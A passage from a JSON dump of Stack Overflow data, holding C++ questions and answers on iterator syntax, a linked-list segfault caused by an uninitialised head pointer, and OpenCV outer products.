the_list;\nstd::list&lt;my_struct&gt;::iterator the_iter = the_list.begin();\n</code></pre>\n\n<p>The code then accesses x and y of <code>the_iter</code> this way:</p>\n\n<pre><code>(*the_iter).x;\n(*the_iter).y;\n</code></pre>\n\n<p>I want to change these to the more readable version:</p>\n\n<pre><code>the_iter-&gt;x;\nthe_iter-&gt;y;\n</code></pre>\n\n<p>From my C perspective, this is totally fine for pointer dereferencing.  Is this also the case for iterators?  Is there any reason why my colleague would use <code>(*pointer).</code> instead of <code>p-&gt;</code></p>\n"}, {"tags": ["c++", "linux", "windows", "segmentation-fault"], "comments": [{"owner": {"reputation": 2717, "user_id": 310888, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91e34fb93000c34c068c444aad6d8df5?s=128&d=identicon&r=PG", "display_name": "Leiaz", "link": "https://stackoverflow.com/users/310888/leiaz"}, "edited": false, "score": 1, "creation_date": 1429738804, "post_id": 29809018, "comment_id": 47746856, "body": "The information given by gdb <i>is</i> helpful. It is telling you the crash happen when calling <code>getSize()</code> in <code>getRemainingMemory()</code>. So next, you should put a breakpoint on <code>getRemainingMemory()</code>. And examine all the variables there. Particularly pointers, as segfaults happen when they are uninitialized ..."}, {"owner": {"reputation": 21, "user_id": 4821197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2876d8361a82e9d586fbbcb74f406bc?s=128&d=identicon&r=PG&f=1", "display_name": "Dante ", "link": "https://stackoverflow.com/users/4821197/dante"}, "reply_to_user": {"reputation": 2717, "user_id": 310888, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91e34fb93000c34c068c444aad6d8df5?s=128&d=identicon&r=PG", "display_name": "Leiaz", "link": "https://stackoverflow.com/users/310888/leiaz"}, "edited": false, "score": 0, "creation_date": 1429739675, "post_id": 29809018, "comment_id": 47747238, "body": "@Leiaz The only reason I had interpreted the information as not being useful was that this was my first time using GDB and was expecting more info (line numbers). But I definitely see what you mean now. Thank you for the help!"}, {"owner": {"reputation": 2717, "user_id": 310888, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91e34fb93000c34c068c444aad6d8df5?s=128&d=identicon&r=PG", "display_name": "Leiaz", "link": "https://stackoverflow.com/users/310888/leiaz"}, "edited": false, "score": 0, "creation_date": 1429740786, "post_id": 29809018, "comment_id": 47747764, "body": "It prints the line numbers if you compiled with debugging symbols (<code>-g</code> option for g++)."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 4821197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2876d8361a82e9d586fbbcb74f406bc?s=128&d=identicon&r=PG&f=1", "display_name": "Dante ", "link": "https://stackoverflow.com/users/4821197/dante"}, "edited": false, "score": 0, "creation_date": 1429740012, "post_id": 29809376, "comment_id": 47747416, "body": "Thank you very much! I hope you don&#39;t mind if I ask another question (I&#39;m still relatively new to pointers). Your solution worked, but why is declaring the head &#39;songs&#39; as NULL in the constructor different from just declaring &#39;songs&#39; NULL in the class declaration?"}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "reply_to_user": {"reputation": 21, "user_id": 4821197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2876d8361a82e9d586fbbcb74f406bc?s=128&d=identicon&r=PG&f=1", "display_name": "Dante ", "link": "https://stackoverflow.com/users/4821197/dante"}, "edited": false, "score": 0, "creation_date": 1429743173, "post_id": 29809376, "comment_id": 47748717, "body": "I&#39;m not up on my C++11 or 14, I don&#39;t think the standard allows you to make assignments in the class definition. All a declaration is guaranteed to do is reserve space, and everything after that is up to you. My understanding is Visual Studio&#39;s compiler is being nice and initializing everything to zero, but virtually all of the time the coder&#39;s going to set that value to something so pre-emptively zeroing is wasted effort."}], "tags": [], "owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "is_accepted": true, "score": 2, "last_activity_date": 1429738818, "creation_date": 1429738818, "answer_id": 29809376, "question_id": 29809018, "link": "https://stackoverflow.com/questions/29809018/segmentation-fault-core-dump-code-works-in-vs-but-not-in-the-linux-terminal/29809376#29809376", "title": "Segmentation Fault (Core Dump) - Code works in VS but not in the Linux Terminal", "body": "<p>I don't see any sign of TsuPod::songs being initialized. There is no guarantee that it's going to be NULL in the empty list case, so your </p>\n\n<pre><code>while (p != NULL)\n</code></pre>\n\n<p>test in TsuPod::getRemainingMemory() may pass with an insane value from the stack and blow up when you use p on the next line.</p>\n\n<p>I recommend</p>\n\n<pre><code>TsuPod::TsuPod():songs(NULL) //default constructor\n{\nmemSize = MAX_SIZE;\n}\n\nTsuPod::TsuPod(int _size):songs(NULL) //constructor for when user specifies their prefered memory size, prevents input of a size greater than MAX_SIZE or less than 0\n{\nif (_size &gt; MAX_SIZE || _size &lt;= 0)\n    memSize = MAX_SIZE;\nelse\n    memSize = _size;\n}\n</code></pre>\n\n<p>to ensure that songs starts with your end of list condition.</p>\n\n<p>Also, consider using std::list to do your list management in place of the roll-your-own linked list.</p>\n"}], "owner": {"reputation": 21, "user_id": 4821197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2876d8361a82e9d586fbbcb74f406bc?s=128&d=identicon&r=PG&f=1", "display_name": "Dante ", "link": "https://stackoverflow.com/users/4821197/dante"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2647, "favorite_count": 0, "closed_date": 1429756412, "accepted_answer_id": 29809376, "answer_count": 1, "score": 1, "last_activity_date": 1429738818, "creation_date": 1429737385, "last_edit_date": 1429738191, "question_id": 29809018, "link": "https://stackoverflow.com/questions/29809018/segmentation-fault-core-dump-code-works-in-vs-but-not-in-the-linux-terminal", "closed_reason": "Not suitable for this site", "title": "Segmentation Fault (Core Dump) - Code works in VS but not in the Linux Terminal", "body": "<p>So, I can run this program in Visual Studio with absolutely no problems, producing correct output. However, after compiling in the Linux terminal, I get a seg fault when trying to run the same code. Upon debugging using GDB, the information given is not very helpful (will be provided below). The program consists of two header files and three .cpp files. I will provide all of them below, along with the debugging information given. (If the indenting is weird, it is because of the 4-space code indent rule for submission). I have been trying to find the issue for hours on end to no avail. I have a feeling it is a small, minor mistake. Thank you all very much in advance.</p>\n\n<p><strong>Song.h</strong></p>\n\n<pre><code>#ifndef Song_h\n#define Song_h\n\n#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n#include &lt;ctime&gt;\n#include &lt;stdlib.h&gt;\n\nusing namespace std;\n\nclass Song\n{\nprivate:\n    string artist;\n    string title;\n    int size;\n\npublic:\n    Song(); //declares blank song array\n\n    Song(string _title, string _artist, int _size); //initializes object with given parameters for Song instance\n\n    string getArtist() const\n    {\n        return artist;\n    }\n\n    string getTitle() const\n    {\n        return title;\n    }\n\n    int getSize() const\n    {\n        return size;\n    }\n\n    void setArtist(string _artist)\n    {\n        artist = _artist;\n    }\n\n    void setTitle(string _title)\n    {\n        title = _title;\n    }\n\n    void setSize(int _size)\n    {\n        size = _size;\n    }\n\n\n    bool operator == (Song const &amp;rhs);\n\n    bool operator != (Song const &amp;rhs);\n\n    bool operator &gt; (Song const &amp;rhs);\n\n    bool operator &lt; (Song const &amp;rhs);\n\n};\n\n#endif\n</code></pre>\n\n<p><strong>TsuPod.h</strong></p>\n\n<pre><code>#ifndef TsuPod_h\n#define TsuPod_h\n#include \"Song.h\"\n\n//TsuPod class declaration\nclass TsuPod\n{\nprivate:\nstruct SongNode\n{\n    Song data;\n    SongNode *next;\n};\n\nSongNode *songs;  //the head pointer\n\nstatic const int MAX_SIZE = 512;\nstatic const int SUCCESS = 0;\nstatic const int FAILURE = 1;\nstatic const int NO_MEMORY = -1;\nstatic const int NOT_FOUND = -2;\nint getNumSongs();\nint memSize;\n\npublic:\nTsuPod();\nTsuPod(int size);\n~TsuPod();\nint addSong(Song const &amp;s);\nint removeSong(Song const &amp;s);\nvoid shuffle();\nvoid showSongList();\nvoid sortSongList();\nint getRemainingMemory();\n\nint getTotalMemory() \n{\n    return memSize;\n}\n};\n</code></pre>\n\n<p><strong>Song.cpp</strong>    </p>\n\n<pre><code>#endif\n\n#include \"TsuPod.h\"\n#include \"Song.h\"\n\nSong::Song() //default constructor, initializes a blank song\n{\nartist = \"\";\ntitle = \"\";\nsize = 0;\n}\n\nSong::Song(string _artist, string _title, int _size) //constructor for   song when arguments are given by user\n{\nartist = _artist;\ntitle = _title;\nsize = _size;\n}\n\nbool Song::operator == (Song const &amp;rhs) //overloaded for sorting\n{\nreturn (title == rhs.title &amp;&amp;\n         artist == rhs.artist &amp;&amp;\n         size == rhs.size);\n}\n\nbool Song::operator != (Song const &amp;rhs) //overloaded for sorting\n{\nreturn (title != rhs.title ||\n    artist != rhs.artist ||\n    size != rhs.size);\n}\n\nbool Song::operator &gt; (Song const &amp;rhs) //overloaded for sorting\n{\nif (artist != rhs.artist)\n    return (artist &gt; rhs.artist);\nelse\nif (title != rhs.title)\n    return (title &gt; rhs.title);\nelse\nif (size != rhs.size)\n    return (size &gt; rhs.size);\nelse \n    return false;\n}\n\nbool Song::operator &lt; (Song const &amp;rhs) //overloaded for sorting\n{\nif (artist != rhs.artist)\n    return (artist &lt; rhs.artist);\nelse\nif (title != rhs.title)\n    return (title &lt; rhs.title);\nelse\nif (size != rhs.size)\n    return (size &lt; rhs.size);\nelse\n    return false;\n\n}\n</code></pre>\n\n<p><strong>TsuPod.cpp</strong></p>\n\n<pre><code>#include \"TsuPod.h\"\n#include \"Song.h\"\n\n\nTsuPod::TsuPod() //default constructor\n{\nmemSize = MAX_SIZE;\n}\n\nTsuPod::TsuPod(int _size) //constructor for when user specifies their prefered memory size, prevents input of a size greater than MAX_SIZE or less than 0\n{\nif (_size &gt; MAX_SIZE || _size &lt;= 0)\n    memSize = MAX_SIZE;\nelse\n    memSize = _size;\n}\n\nTsuPod::~TsuPod() //destructor\n{\nSongNode *p;\n\nwhile (songs != NULL)\n{\n    p = songs;\n    songs = songs-&gt;next;\n    delete p;   \n}\n}\n\n\nint TsuPod::getRemainingMemory() //finds remaining memory, returns int value\n{\nint memSum = 0;\nSongNode *p = songs;\n\nwhile (p != NULL)\n{\n    memSum += p-&gt;data.getSize();\n    p = p-&gt;next;\n}\nreturn memSize - memSum; \n}\n\nint TsuPod::addSong(Song const &amp;s) //adds song to TsuPod, returns int number to display result, 0 = success, 1 = failure, -1 = not enough memory\n{\nif (s.getSize() &gt; getRemainingMemory()) //ensures there is enough unsused memory for song \n    return NO_MEMORY;\n\nif (s.getSize() &gt; 0) //ensures song is valid\n{\n    SongNode *temp = new SongNode;\n    temp-&gt;data = s;\n    temp-&gt;next = songs;\n    songs = temp;\n    return SUCCESS;\n}\n\nelse\n    return FAILURE;\n\n}\n\n\nint TsuPod::removeSong(Song const &amp;s) //removes song, returns int value to display result, 0 = success, 1 = failure, -2 = not found\n{\nif (songs != NULL)\n{\n    SongNode *prev = NULL;\n    SongNode *p = songs;\n\n    if (p-&gt;data == s)\n    {\n        songs = p-&gt;next;\n        return SUCCESS;\n    }\n\n    while (p != NULL &amp;&amp; p-&gt;data != s)\n    {\n        prev = p;\n        p = p-&gt;next;\n\n        if (songs-&gt;data == s) \n        {\n            songs = p-&gt;next;\n            delete p;\n            return SUCCESS;\n        }\n\n        else \n        if (p-&gt;data == s)\n        {\n            prev-&gt;next = p-&gt;next;\n            delete p;\n            return SUCCESS;\n        }\n        else\n        {\n\n        }\n    }  \n}\nreturn NOT_FOUND;\n}\n\nint TsuPod::getNumSongs() //calculates number of songs, returns int value\n{\nSongNode *p1 = songs;\nint i = 0;\nwhile (p1 != NULL)\n{\n    i++;\n    p1 = p1-&gt;next;\n}\n\nreturn i;\n}\n\nvoid TsuPod::shuffle() //shuffles TsuPod song list, void return value\n{\nsrand((unsigned)time(NULL));\nfor (int j = 0; j &lt; getNumSongs() * 2; j++)\n{   \n    int r1 = rand() % getNumSongs();\n    int r2 = rand() % getNumSongs();\n\n    SongNode *p1 = songs;\n    SongNode *p2 = songs;\n\n    for (int i = 0; i &lt; r1; i++)\n        p1 = p1-&gt;next;\n\n    for (int i = 0; i &lt; r2; i++)\n        p2 = p2-&gt;next;\n\n    Song temp = p1-&gt;data;\n    p1-&gt;data = p2-&gt;data;\n    p2-&gt;data = temp;\n}\n\ncout &lt;&lt; endl &lt;&lt; \" PLAYLIST SHUFFLED\" &lt;&lt; endl &lt;&lt; endl;\n}\n\nvoid TsuPod::sortSongList() //sorts song list by artist, title, and size respectively, void return value\n{\nfor (SongNode *p1 = songs; p1 != NULL; p1 = p1-&gt;next)\n{\n    SongNode *small = p1;\n    for (SongNode *p2 = p1-&gt;next; p2 != NULL; p2 = p2-&gt;next)\n    {\n        if (small-&gt;data &gt; p2-&gt;data)\n        {\n            small = p2;\n        }\n    }\n\n    if (p1 != small)\n    {\n        Song temp = small-&gt;data;\n        small-&gt;data = p1-&gt;data;\n        p1-&gt;data = temp;\n    }\n}\ncout &lt;&lt; endl &lt;&lt; \" PLAYLIST SORTED\" &lt;&lt; endl;\n}\n\nvoid TsuPod::showSongList() //shows song list, void return value\n{\ncout &lt;&lt; \"             ___________________________________________________                  \" &lt;&lt; endl &lt;&lt; \"                                TsuPod 2.0\" &lt;&lt; endl &lt;&lt; endl;\ncout &lt;&lt; \"          Memory ----                 Total: \" &lt;&lt; getTotalMemory() &lt;&lt; \" MB\" &lt;&lt; \"   --   Remaining: \" &lt;&lt; getRemainingMemory() &lt;&lt; \" MB\" &lt;&lt; endl;\n\nSongNode *p = songs;\nint i = 0;\nwhile (p != NULL)\n{\n   i++;\n    cout &lt;&lt; endl &lt;&lt; \" \" &lt;&lt; i &lt;&lt; \". \" &lt;&lt; p-&gt;data.getArtist();\n\n    int artistLength = p-&gt;data.getArtist().length();\n    for (int j = 0; j &lt; (24 - artistLength); j++) //This loop is implemented to evenly space the artist from the song\n        cout &lt;&lt; \" \";\n\n    cout &lt;&lt; p-&gt;data.getTitle();\n\n    int titleLength = p-&gt;data.getTitle().length();\n    for (int j = 0; j &lt; (24 - titleLength); j++) //This loop is implemented to evenly space the song title from the song size\n        cout &lt;&lt; \" \";\n\n    cout &lt;&lt; p-&gt;data.getSize() &lt;&lt; \" (MB)\" &lt;&lt; endl;\n\n    p = p-&gt;next;\n}\n\ncout &lt;&lt; endl;\n\n}\n</code></pre>\n\n<p><strong>TsuPod_Driver.cpp</strong></p>\n\n<pre><code>#include &lt;cstdlib&gt;\n#include &lt;iostream&gt;\n#include \"Song.h\"\n#include \"TsuPod.h\"\n\nusing namespace std;\n\nint main(int argc, char *argv[]) \n{\nTsuPod t;\n\nSong s1(\"Animals As Leaders\", \"Another Year\", 4);\nint result = t.addSong(s1);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s2(\"Gorillaz\", \"Stylo\", 6);\nresult = t.addSong(s2);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s3(\"August Burns Red\", \"Meridian\", 6);\nresult = t.addSong(s3);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s4(\"The Ink Spots\", \"If I Didn't Care\", 7);\nresult = t.addSong(s4);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s5(\"Beatles\", \"I Feel Fine\", 241);\nresult = t.addSong(s5);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s6(\"Fine Constant\", \"Sea\", 3);\nresult = t.addSong(s6);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s7(\"Human Abstract\", \"Nocturne\", 9);\nresult = t.addSong(s7);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s8(\"August Burns Red\", \"Meridian\", 4);\nresult = t.addSong(s8);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\nSong s9(\"Frank Sinatra\", \"My Way\", 5);\nresult = t.addSong(s9);\ncout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n\n\n\nt.showSongList();   \nt.shuffle();\nt.showSongList();\nt.sortSongList();\nt.showSongList();\n\n\nresult = t.removeSong(s1);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s2);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s3);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nt.showSongList();\n\nresult = t.removeSong(s4);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s5);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s6);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s7);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s8);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nresult = t.removeSong(s9);\ncout &lt;&lt; \" delete result = \" &lt;&lt; result &lt;&lt; endl;\n\nt.showSongList();\n\ncout &lt;&lt; \" memory = \" &lt;&lt; t.getRemainingMemory() &lt;&lt; endl &lt;&lt; endl &lt;&lt; endl &lt;&lt; endl;\n\nfor (int i = 1; i &lt; 33; i++) //tests to ensure that user cannot add a song when there is not enough space available \n{\n    Song s1(\"August Burns Red\", \"Meridian\", i);\n    result = t.addSong(s1);\n    cout &lt;&lt; \" add result = \" &lt;&lt; result &lt;&lt; endl;\n}\n\nt.showSongList();\n\ncin.get();\nreturn EXIT_SUCCESS;\n</code></pre>\n\n<p><strong>Debugging Info From Linux Terminal</strong></p>\n\n<pre><code>Program received signal SIGSEGV, Segmentation fault.\n0x0000000000402d50 in Song::getSize() const ()\n(gdb) backtrace\n#0  0x0000000000402d50 in Song::getSize() const ()\n#1  0x00000000004024ac in TsuPod::getRemainingMemory() ()\n#2  0x00000000004024fb in TsuPod::addSong(Song const&amp;) ()\n#3  0x000000000040112e in main ()\n</code></pre>\n"}, {"tags": ["c++", "opencv"], "comments": [{"owner": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "edited": false, "score": 0, "creation_date": 1429768438, "post_id": 29808896, "comment_id": 47756967, "body": "int type is not supported for this, you need CV_32F or such"}, {"owner": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "reply_to_user": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "edited": false, "score": 1, "creation_date": 1429794807, "post_id": 29808896, "comment_id": 47775370, "body": "From <a href=\"http://docs.opencv.org/modules/core/doc/operations_on_arrays.html#multransposed\" rel=\"nofollow noreferrer\">the docs</a>: mulTransposed &quot;can multiply not only floating-point matrices.&quot; See @beaker&#39;s answer below. He lists which types are supported. Integers are but only 8 and 16 bit types"}], "answers": [{"comments": [{"owner": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "edited": false, "score": 0, "creation_date": 1429745547, "post_id": 29810616, "comment_id": 47749557, "body": "Maybe I&#39;m doing something wrong, but when I call that function on a <code>Mat</code> of type <code>CV_32SC1</code> I get an &quot;unsupported format or combination of formats&quot; error from OpenCV. I checked the docs and they specifically mention that mulTransposed &quot;can multiply not only floating-point matrices.&quot; For me <code>tmp</code> is type <code>CV_32SC1</code>, but it still fails when I specify the type of the <code>outerProduct</code> <code>Mat</code>. Any ideas what&#39;s up?"}, {"owner": {"reputation": 14828, "user_id": 1377097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eFG0R.png?s=128&g=1", "display_name": "beaker", "link": "https://stackoverflow.com/users/1377097/beaker"}, "reply_to_user": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "edited": false, "score": 0, "creation_date": 1429748488, "post_id": 29810616, "comment_id": 47750550, "body": "Checking, but I&#39;m seeing the same thing when I use <code>CV_32SC1</code> instead of <code>double</code>, even if I specify the <code>dtype</code> parameter as <code>CV_32SC1</code> or <code>-1</code>."}, {"owner": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "edited": false, "score": 0, "creation_date": 1429749064, "post_id": 29810616, "comment_id": 47750746, "body": "Strange... I&#39;ll have to poke around. Thanks again!"}, {"owner": {"reputation": 14828, "user_id": 1377097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eFG0R.png?s=128&g=1", "display_name": "beaker", "link": "https://stackoverflow.com/users/1377097/beaker"}, "reply_to_user": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "edited": false, "score": 0, "creation_date": 1429749071, "post_id": 29810616, "comment_id": 47750749, "body": "Wow. Just for kicks, try <code>CV_16SC1</code>. I&#39;m looking through the code and there&#39;s no mention of <code>CV_32S</code>, only 16-bit integers."}], "tags": [], "owner": {"reputation": 14828, "user_id": 1377097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eFG0R.png?s=128&g=1", "display_name": "beaker", "link": "https://stackoverflow.com/users/1377097/beaker"}, "is_accepted": true, "score": 8, "last_activity_date": 1474845983, "last_edit_date": 1495542282, "creation_date": 1429744401, "answer_id": 29810616, "question_id": 29808896, "link": "https://stackoverflow.com/questions/29808896/computing-outer-tensor-product-of-cvmat-in-opencv/29810616#29810616", "title": "Computing outer (tensor) product of cv::Mat in OpenCv", "body": "<p>Note that while my answer is correct, <a href=\"https://stackoverflow.com/a/33242361/1377097\">@kaanoner's answer</a> gives better performance.</p>\n\n<hr>\n\n<p>They sneak these methods in where you least expect. This one is in <a href=\"http://docs.opencv.org/modules/core/doc/operations_on_arrays.html\" rel=\"nofollow noreferrer\">Operations on Arrays</a> and it's called <a href=\"http://docs.opencv.org/modules/core/doc/operations_on_arrays.html#multransposed\" rel=\"nofollow noreferrer\">mulTransposed</a>.</p>\n\n<pre><code>cv::Mat tmp = (Mat_&lt;double&gt;(9,1) &lt;&lt; 1, 2, 3, 4, 5, 6, 7, 8, 9);\ncv::Mat outerProduct;\nmulTransposed(tmp, outerProduct, false);\n</code></pre>\n\n<p>The third parameter is <code>aTa</code>. If it's true, the method calculates a<sup>T</sup>a. If it's false, it calculates aa<sup>T</sup>.</p>\n\n<p>Output is:</p>\n\n<pre><code>tmp = \n[1; 2; 3; 4; 5; 6; 7; 8; 9]\nouterProduct = \n[1, 2, 3, 4, 5, 6, 7, 8, 9;\n 2, 4, 6, 8, 10, 12, 14, 16, 18;\n 3, 6, 9, 12, 15, 18, 21, 24, 27;\n 4, 8, 12, 16, 20, 24, 28, 32, 36;\n 5, 10, 15, 20, 25, 30, 35, 40, 45;\n 6, 12, 18, 24, 30, 36, 42, 48, 54;\n 7, 14, 21, 28, 35, 42, 49, 56, 63;\n 8, 16, 24, 32, 40, 48, 56, 64, 72;\n 9, 18, 27, 36, 45, 54, 63, 72, 81]\n</code></pre>\n\n<p>Looking through the source code, it appears that <code>CV_32S</code> is not supported by <code>mulTransposed</code>. Here are the source and destination types they specify:</p>\n\n<pre><code>(stype == CV_8U &amp;&amp; dtype == CV_32F)\n(stype == CV_8U &amp;&amp; dtype == CV_64F)\n(stype == CV_16U &amp;&amp; dtype == CV_32F)\n(stype == CV_16U &amp;&amp; dtype == CV_64F)\n(stype == CV_16S &amp;&amp; dtype == CV_32F)\n(stype == CV_16S &amp;&amp; dtype == CV_64F)\n(stype == CV_32F &amp;&amp; dtype == CV_32F)\n(stype == CV_32F &amp;&amp; dtype == CV_64F)\n(stype == CV_64F &amp;&amp; dtype == CV_64F)\n</code></pre>\n\n<p>As this implies, the destination type is always a float type. Even when I specify a dtype of <code>CV_16S</code>, I get a matrix that's <code>CV_32F</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 14828, "user_id": 1377097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eFG0R.png?s=128&g=1", "display_name": "beaker", "link": "https://stackoverflow.com/users/1377097/beaker"}, "edited": false, "score": 1, "creation_date": 1450718335, "post_id": 33242361, "comment_id": 56543411, "body": "This is really interesting. One thing I noticed is that the input arrays must be floats, but that doesn&#39;t seem to be a very big restriction for such a performance gain. Good catch!"}], "tags": [], "owner": {"reputation": 501, "user_id": 5272880, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/M3iYH.jpg?s=128&g=1", "display_name": "kaanoner", "link": "https://stackoverflow.com/users/5272880/kaanoner"}, "is_accepted": false, "score": 3, "last_activity_date": 1445359861, "creation_date": 1445359861, "answer_id": 33242361, "question_id": 29808896, "link": "https://stackoverflow.com/questions/29808896/computing-outer-tensor-product-of-cvmat-in-opencv/33242361#33242361", "title": "Computing outer (tensor) product of cv::Mat in OpenCv", "body": "<p>In my runs, the transpose and multiply method is twice as fast as than the single <a href=\"http://docs.opencv.org/modules/core/doc/operations_on_arrays.html#multransposed\" rel=\"nofollow\">mulTransposed</a> function call.</p>\n\n<pre><code>Mat descriptor; //(1 rows x 192 cols, CV_32F)\nMat outerProduct;\n\n// calculates outer products for 10000 different descriptors in a loop\nmulTransposed(descriptor, outerProduct, true); // =&gt; takes 33 secs\nouterProduct = descriptor.t()*descriptor; // =&gt; takes 14 secs \n</code></pre>\n"}], "owner": {"reputation": 2870, "user_id": 3427580, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/73909f88442d1b4be6cebec37c9d1aaf?s=128&d=identicon&r=PG&f=1", "display_name": "marcman", "link": "https://stackoverflow.com/users/3427580/marcman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1858, "favorite_count": 1, "accepted_answer_id": 29810616, "answer_count": 2, "score": 3, "last_activity_date": 1474845983, "creation_date": 1429736987, "last_edit_date": 1429738041, "question_id": 29808896, "link": "https://stackoverflow.com/questions/29808896/computing-outer-tensor-product-of-cvmat-in-opencv", "title": "Computing outer (tensor) product of cv::Mat in OpenCv", "body": "<p>Is there a way to computer the outer product (<strong>z</strong> * transpose(<strong>z</strong>) for some column vector <strong>z</strong>) using the <code>cv::Mat</code> data structure in OpenCV?</p>\n\n<p>I've checked <a href=\"http://docs.opencv.org/modules/core/doc/basic_structures.html\" rel=\"nofollow\">the documentation</a> and there's no built in function. But I'm getting exceptions trying to use the standard matrix multiplication expression (*) with a vector of type <code>cv::Mat</code>.</p>\n\n<p>Here's the (pseudo)code:</p>\n\n<pre><code>cv::Mat tmp = cv::Mat::zeros(9, 1, CV_32SC1)\ncv::Mat outerProduct = tmp * tmp.t();\n</code></pre>\n\n<p>The outer product calculation gives exceptions. (Yes I have actual values in the tmp matrix in my actual code, but this description gives more info about the data type being used)</p>\n\n<p>Ideally, the <code>cv::Mat outerProduct</code> should end up as a 9x9 matrix.</p>\n\n<p>I could do it using the scaling multiplication property of <code>cv::Mat</code> (i.e. repeat the column vector <code>tmp</code> by its dimensions, and for each column, scale the elements by the value in the index--<a href=\"http://en.wikipedia.org/wiki/Outer_product#Definition_.28matrix_multiplication.29\" rel=\"nofollow\">as in how you may solve this kind of multiplication by hand</a>):</p>\n\n<pre><code>cv::Mat outerProduct = cv::repeat(tmp, 1, 9);\nfor (int i = 0; i &lt; 9; i++)\n{\n    outerProduct.col(i) *= tmp.at&lt;int&gt;(i, 0);\n}\n</code></pre>\n\n<p>...but it would be nice to have a better way if there is one.</p>\n"}, {"tags": ["c++", "operator-overloading", "member-functions", "argument-dependent-lookup", "non-member-functions"], "answers": [{"tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": true, "score": 2, "last_activity_date": 1429741561, "last_edit_date": 1429741561, "creation_date": 1429737686, "answer_id": 29809096, "question_id": 29808850, "link": 